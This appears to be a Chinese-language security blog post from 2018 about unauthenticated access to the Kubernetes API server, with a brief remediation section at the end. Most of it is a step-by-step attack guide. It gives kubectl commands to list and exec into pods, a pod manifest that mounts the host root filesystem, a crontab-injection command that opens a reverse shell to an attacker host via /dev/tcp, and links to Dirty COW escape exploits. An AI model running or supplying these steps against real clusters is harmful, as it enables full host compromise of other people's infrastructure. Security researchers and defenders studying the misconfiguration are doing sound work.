title: Kubernetes Api Server 未授权访问漏洞
date: 2018-12-05
----

# 0x00 漏洞原因

Kubernetes 的服务在正常启动后会开启两个端口：

1. Localhost Port （默认8080）
2. Secure Port （默认6443）

这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。

![Web 页面](https://i.loli.net/2018/12/05/5c07dec609ff5.png)

正常情况下 Api Server 是有权限控制的，分三种：

1. Authentication
2. Authorization
3. AdmissionControl

如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限，甚至通过创建自定义的容器去获取宿主机的权限。

# 0x01 漏洞利用

利用方式按严重程度来说分两种，一种是直接通过利用 kubectl 客户端调用 Secure Port 接口去控制已经创建好的容器。另外一种利用方法就是通过创建一个自定义的容器将系统根目录的文件挂在到/mnt目录，通过修改/mnt/etc/crontab 来影响宿主机的 crontab，获取一个反弹 Shell 拿到宿主机的权限。先说第一种方式。


首先，通过下面命令，去发现已经存在的容器

```
kubectl -s ip:port  get pods
```

![发现的容器](https://i.loli.net/2018/12/05/5c07e27b68f05.png)

然后直接连接这个容器获取 Shell。


```
kubectl -s ip:port  --namespace=default exec -it dockername bash
```
![获取容器权限](https://i.loli.net/2018/12/06/5c07f8c667de8.png)

这样就达到了控制容器的目的，但是容器的权限本身是不稳定的，如果宿主机本身的内核有问题的话，可以利用脏牛漏洞进行提权，获取宿主机的权限。具体可以参考：

[PoC for Dirty COW (CVE-2016-5195)](https://github.com/scumjr/dirtycow-vdso)
[DDirtycow-docker-vdso](https://github.com/gebl/dirtycow-docker-vdso)

第二种方式就比较厉害了，利用成功后造成的危害也最大。

首先我们根据官方的规范新建一个标准文件 `myapp.yaml` ,当然也可以使用 json 格式的。


```
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - image: nginx
    name: container
    volumeMounts:
    - mountPath: /mnt
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /
```
其中的 image 可以更换，最好使用基础镜像。

然后我们可以通过两种方式提交我们创建容器的请求，一种是通过他的 Web 页面（也就是默认的8080端口）

![Web 端方式提交](https://i.loli.net/2018/12/05/5c07e697f2044.png)

另外我们也可以通过他的另外的接口，通过 kubectl 客户端进行任务的提交。


```
kubectl -s  ip:port create -f yourfile
```

这里如果出现`Error from server (NotFound): the server could not find the requested resource`报错，可能是因为你的 kubectl 客户端和 kubernetes 的 server 端版本不相同导致的，一定要确保版本相同。

![版本确认](https://i.loli.net/2018/12/05/5c07edbf2b85e.png)

提交成功后，我们用之前命令获取容器的 bash，然后向容器的 `/mnt/etc/crontab` 写入反弹 shell 的定时任务，因为创建容器时把宿主机的根目录挂载到了容器的/mnt 目录下，所以可以直接影响到宿主机的 crontab。


```
echo -e "* * * * * root bash -i >& /dev/tcp/ip/port 0>&1\n" >> /mnt/etc/crontab
```

接下来就是见证奇迹的时刻，耐心的等待你就能拿到 Shell 了，验证之后可以确认是宿主机的权限，而不是容器的权限

![获取宿主机权限](https://i.loli.net/2018/12/05/5c07e92f66a77.png)

# 0x01 漏洞修复

在使用 kubernetes 的时候我们一定要进行身份的校验，K8S 的 APi 其实有非常严格的认证和授权

![校验认证流程](https://i.loli.net/2018/12/05/5c07ea3d72caa.png)

最简单的是在 Authentication 增加静态的 password，或者 token，可以的话关闭 Web 端口的服务，保持最小化原则，避免安全风险的产生，可以参考 [官方文档](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#static-password-file)


